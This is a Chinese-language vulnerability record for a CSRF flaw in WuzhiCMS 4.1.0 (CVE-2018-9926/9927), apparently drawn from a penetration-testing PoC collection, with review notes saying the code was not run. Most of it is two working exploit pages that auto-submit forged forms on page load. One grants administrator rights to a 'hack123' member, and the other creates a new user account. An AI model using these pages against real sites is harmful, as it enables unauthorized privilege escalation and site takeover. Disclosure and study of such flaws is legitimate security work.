---
cve: "CVE-2018-9926"
source: "Mr-xn/Penetration_Testing_POC"
product: "WuzhiCMS4.1.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-9926; CVE-2018-9927"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "五指CMS 4.1.0存在CSRF漏洞可增加管理员账户2"
prerequisites: "来源所述条件，未列明部分仍待核：victimadminsession; existinghack123member forpowerassignment or priorcreate; _suadminpath known"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3626dd3d27cd89a2586d631e"
entity_id: "ve-3626dd3d27cd89a2586d631e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：victimadminsession; existinghack123member forpowerassignment or priorcreate; _suadminpath known

- **事实待核（1）**：元数据只9926，表格双CVE和两个动作应分别映射主实体。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：第一poweradd密码空似给既有member赋管理员，第二memberadd创建普通用户；流程顺序/前置账户需说明，标题增加管理员不够准确。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：var fields未初始化会加undefined文本，一般不阻表单但应修为字符串。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：有自动onload与GitHubissue128原源，回环目标需替换；无修复版本/响应。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 五指CMS 4.1.0存在CSRF漏洞可增加管理员账户2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|五指CMS 4.1.0存在CSRF漏洞可增加管理员账户|2018-04-10|套哥（taoge@5ecurity.cn）|[https://github.com/wuzhicms/wuzhicms](https://github.com/wuzhicms/wuzhicms) | [https://github.com/wuzhicms/wuzhicms](https://github.com/wuzhicms/wuzhicms) |4.1.0| [CVE-2018-9926](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9926)/[CVE-2018-9927](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9927)|  

#### 漏洞概述  

> 五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。五指CMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/wuzhicms/wuzhicms/issues/128)告知作者。   


### POC实现代码如下：  

> CSRF测试页面代码一如下：  
 
``` html
<html><body>
    <script type="text/javascript">
    function post(url,fields)
    {
    var p = document.createElement("form");
    p.action = url;
    p.innerHTML = fields;
    p.target = "_self";
    p.method = "post";
    document.body.appendChild(p);
    p.submit();
    }
    function csrf_hack()
    {
    var fields;
    
    fields += "<input type='hidden' name='form[role][]' value='1' />";
    fields += "<input type='hidden' name='form[username]' value='hack123' />"; 
    fields += "<input type='hidden' name='form[password]' value='' />"; 
    fields += "<input type='hidden' name='form[truename]' value='taoge@5ecurity' />"; 
    
    var url = "http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=提交";
    post(url,fields);
    }
    window.onload = function() { csrf_hack();}
    </script>
    </body></html>
```

> CSRF测试页面代码二如下：  

``` html
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='info[username]' value='hack123' />";
fields += "<input type='hidden' name='info[password]' value='hacktest' />"; 
fields += "<input type='hidden' name='info[pwdconfirm]' value='hacktest' />"; 
fields += "<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />"; 
fields += "<input type='hidden' name='info[mobile]' value='' />"; 
fields += "<input type='hidden' name='modelids[]' value='10' />"; 
fields += "<input type='hidden' name='info[groupid]' value='3' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />";
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='avatar' value='' />"; 
fields += "<input type='hidden' name='islock' value='0' />";
fields += "<input type='hidden' name='sys_name' value='0' />";
fields += "<input type='hidden' name='info[birthday]' value='' />"; 
fields += "<input type='hidden' name='info[truename]' value='' />"; 
fields += "<input type='hidden' name='info[sex]' value='0' />";
fields += "<input type='hidden' name='info[marriage]' value='0' />";

var url = "http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=提交";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
